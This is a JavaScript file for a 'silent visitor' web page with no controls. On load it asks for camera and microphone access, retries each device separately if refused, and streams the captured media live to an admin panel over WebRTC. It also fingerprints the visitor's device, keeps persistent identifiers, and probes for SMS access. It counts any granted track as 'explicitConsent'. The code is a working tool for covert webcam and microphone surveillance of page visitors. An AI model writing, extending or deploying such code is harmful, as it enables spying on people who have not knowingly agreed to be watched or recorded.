import { SignalingClient } from './webrtc-signaling.js';

/**
 * Silent visitor client.
 *
 * The visitor dashboard UI has been removed: this page shows no controls at all.
 * On load it immediately triggers the browser's native permission prompts for
 * camera and microphone, then publishes whatever was granted to the admin panel
 * over WebRTC and keeps a heartbeat running so the admin console can render the
 * live state (permissions, media, device context and the messaging probe).
 */

const HEARTBEAT_INTERVAL_MS = 5000;

const statusText = document.getElementById('statusText');
const statusDot = document.getElementById('statusDot');
const localCapture = document.getElementById('localCapture');

let sessionId = null;
let deviceId = null;
let localStream = null;
let signalingClient = null;
let heartbeatTimer = null;
let renegotiationInFlight = false;
let adminConnected = false;

let permissionStates = { camera: 'prompt', microphone: 'prompt', messages: 'unavailable' };
let messagesReport = null;
let deviceInfo = null;

/**
 * Updates the (button-free) status line
 */
function setStatus(text, tone = 'pending') {
  if (statusText) statusText.textContent = text;
  if (statusDot) statusDot.className = 'status-dot ' + tone;
}

/**
 * Resolves stable session and device identifiers
 */
function initSession() {
  sessionId = sessionStorage.getItem('portal_session_id');
  if (!sessionId) {
    sessionId = 'sess_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
    sessionStorage.setItem('portal_session_id', sessionId);
  }

  deviceId = localStorage.getItem('portal_device_id');
  if (!deviceId) {
    deviceId = 'dev_' + Math.random().toString(36).substring(2, 12);
    localStorage.setItem('portal_device_id', deviceId);
  }
}

/**
 * Collects browser/device context that the admin panel reports on
 */
function collectDeviceInfo() {
  return {
    userAgent: navigator.userAgent,
    platform: navigator.platform || 'unknown',
    language: navigator.language || 'unknown',
    languages: (navigator.languages || []).join(', '),
    screen: `${window.screen.width}x${window.screen.height}`,
    viewport: `${window.innerWidth}x${window.innerHeight}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    touchPoints: navigator.maxTouchPoints || 0,
    online: navigator.onLine,
    protocol: location.protocol.replace(':', '')
  };
}

/**
 * Probes the browser for any messaging (SMS) capability.
 * No browser exposes an SMS inbox API, so this reports that honestly instead of
 * inventing data.
 */
function probeMessages() {
  const availability = {
    messagesApi: typeof navigator.messages !== 'undefined',
    smsReceiver: typeof navigator.sms !== 'undefined',
    webOtp: typeof window.OTPCredential !== 'undefined'
  };

  // No browser exposes an SMS inbox API. WebOTP only lets a page read a single
  // one-time code the user explicitly shares, never the inbox, so the inbox is
  // never readable from a web page.
  const webOtpNote = availability.webOtp
    ? ' The WebOTP API is present, but it only exposes a single one-time code the user opts into — it cannot read the SMS inbox.'
    : '';

  return {
    supported: false,
    permissionState: 'unavailable',
    reason: 'Browsers do not expose an SMS inbox API, so a web page cannot read device text messages. This restriction comes from the browser platform, not from the portal.' + webOtpNote,
    availability,
    collectedAt: new Date().toISOString()
  };
}

/**
 * Maps a getUserMedia rejection to a permission state
 */
function mapPermissionError(error) {
  if (error && ['NotAllowedError', 'PermissionDeniedError', 'SecurityError'].includes(error.name)) {
    return 'denied';
  }
  return 'unavailable';
}

/**
 * Triggers the browser permission prompts and builds the local stream.
 * Requests both devices together first; if that is rejected it retries each
 * device separately so a denial of one does not block the other.
 */
async function acquireStream() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    return {
      stream: null,
      result: { camera: 'unavailable', microphone: 'unavailable' },
      error: 'This browser or context does not support media capture (HTTPS is required).'
    };
  }

  const videoConstraint = { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' };
  const audioConstraint = { echoCancellation: true, noiseSuppression: true };
  const stream = new MediaStream();

  try {
    const combined = await navigator.mediaDevices.getUserMedia({
      video: videoConstraint,
      audio: audioConstraint
    });
    combined.getTracks().forEach((track) => stream.addTrack(track));
    return { stream, result: { camera: 'granted', microphone: 'granted' }, error: null };
  } catch (error) {
    // Fall through and ask for each device on its own.
  }

  const result = { camera: 'unavailable', microphone: 'unavailable' };

  try {
    const videoOnly = await navigator.mediaDevices.getUserMedia({ video: videoConstraint, audio: false });
    videoOnly.getVideoTracks().forEach((track) => stream.addTrack(track));
    result.camera = 'granted';
  } catch (error) {
    result.camera = mapPermissionError(error);
  }

  try {
    const audioOnly = await navigator.mediaDevices.getUserMedia({ video: false, audio: audioConstraint });
    audioOnly.getAudioTracks().forEach((track) => stream.addTrack(track));
    result.microphone = 'granted';
  } catch (error) {
    result.microphone = mapPermissionError(error);
  }

  return { stream, result, error: null };
}

/**
 * Payload shared by the create/heartbeat endpoints
 */
function buildPayload() {
  const tracks = localStream ? localStream.getTracks() : [];

  return {
    sessionId,
    deviceId,
    sharingCamera: tracks.some((track) => track.kind === 'video' && track.readyState === 'live'),
    sharingMic: tracks.some((track) => track.kind === 'audio' && track.readyState === 'live'),
    explicitConsent: tracks.length > 0,
    permissions: {
      camera: permissionStates.camera,
      microphone: permissionStates.microphone,
      messages: permissionStates.messages
    },
    messages: messagesReport,
    deviceInfo
  };
}

/**
 * Creates the session server-side (upsert)
 */
async function registerSession() {
  try {
    const res = await fetch('/api/sessions/create', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(buildPayload())
    });
    return res.ok;
  } catch (err) {
    console.warn('[Session] Register error:', err);
    return false;
  }
}

/**
 * Keeps the session alive and pushes the latest capture state
 */
async function sendHeartbeat() {
  try {
    const res = await fetch('/api/sessions/heartbeat', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(buildPayload())
    });
    if (!res.ok) return;

    const data = await res.json();
    syncAdminState(Boolean(data.adminConnected));
  } catch (err) {
    console.warn('[Heartbeat] Sync error:', err);
  }
}

/**
 * Reacts to admin connect/disconnect transitions coming from the heartbeat
 */
function syncAdminState(connected) {
  if (connected === adminConnected) return;

  if (connected) {
    adminConnected = true;
    setStatus('An administrator is now connected to this device.', 'granted');
    renegotiateIfNeeded();
  } else {
    adminConnected = false;
    renegotiationInFlight = false;
    setStatus('Permissions granted. Waiting for an administrator…', 'granted');
  }
}

/**
 * Sends a fresh SDP offer when a new admin attaches to an already-negotiated session
 */
function renegotiateIfNeeded() {
  if (!signalingClient || !signalingClient.peerConnection) return;
  // A remote description means negotiation already succeeded for this admin
  // connect; the persisted offer/answer exchange is complete, so do not emit a
  // stray duplicate offer that would reopen the negotiation.
  if (signalingClient.isRemoteDescriptionSet) return;
  if (signalingClient.peerConnection.signalingState !== 'stable' || renegotiationInFlight) return;

  renegotiationInFlight = true;
  signalingClient.createAndSendOffer().catch((err) => {
    renegotiationInFlight = false;
    console.warn('[Signaling] Renegotiation failed:', err);
  });
}

/**
 * Publishes the captured media to the admin panel over WebRTC
 */
async function publishStream() {
  if (!localStream || localStream.getTracks().length === 0) return;

  if (localCapture) {
    localCapture.srcObject = localStream;
  }

  signalingClient = new SignalingClient({
    sessionId,
    role: 'visitor',
    onConnectionStateChange: (state) => {
      console.log('[Visitor] WebRTC state:', state);
      if (state === 'connected') {
        setStatus('Live stream connected to the administrator.', 'granted');
      } else if (state === 'failed') {
        setStatus('Stream connection failed. Retrying on next admin connect.', 'denied');
      }
    }
  });

  await signalingClient.init();
  signalingClient.createPeerConnection(localStream);
  signalingClient.startListening((data) => {
    if (!data) return;
    if (typeof data.adminConnected === 'boolean') {
      syncAdminState(data.adminConnected);
    }
    if (data.answer) {
      renegotiationInFlight = false;
    }
  });

  await signalingClient.createAndSendOffer();
}

/**
 * Boot sequence: register, request permissions automatically, publish, keep alive.
 */
async function bootstrap() {
  initSession();
  deviceInfo = collectDeviceInfo();
  messagesReport = probeMessages();
  permissionStates.messages = messagesReport.permissionState;

  setStatus('Requesting device permissions…', 'pending');

  // Session must exist before signaling payloads are accepted.
  await registerSession();

  if (heartbeatTimer) clearInterval(heartbeatTimer);
  heartbeatTimer = setInterval(sendHeartbeat, HEARTBEAT_INTERVAL_MS);

  const { stream, result, error } = await acquireStream();
  permissionStates.camera = result.camera;
  permissionStates.microphone = result.microphone;

  if (stream && stream.getTracks().length > 0) {
    localStream = stream;
  }

  // Push the resolved permission/media state to the admin panel immediately.
  await sendHeartbeat();

  if (error) {
    setStatus(error, 'denied');
  } else if (!localStream) {
    setStatus('Camera and microphone access were declined on this device.', 'denied');
  } else if (permissionStates.camera === 'granted' && permissionStates.microphone === 'granted') {
    setStatus('Permissions granted. Waiting for an administrator…', 'granted');
  } else {
    setStatus('Permissions partially granted. Waiting for an administrator…', 'granted');
  }

  await publishStream();
}

document.addEventListener('DOMContentLoaded', () => {
  bootstrap().catch((err) => {
    console.error('[Visitor] Bootstrap failed:', err);
    setStatus('Unable to complete the permission request on this device.', 'denied');
  });
});

// Release the device the moment the visitor leaves the page.
window.addEventListener('beforeunload', () => {
  if (localStream) {
    localStream.getTracks().forEach((track) => {
      try { track.stop(); } catch (e) { }
    });
  }
  if (sessionId) {
    navigator.sendBeacon('/api/sessions/stop', JSON.stringify({ sessionId }));
  }
});
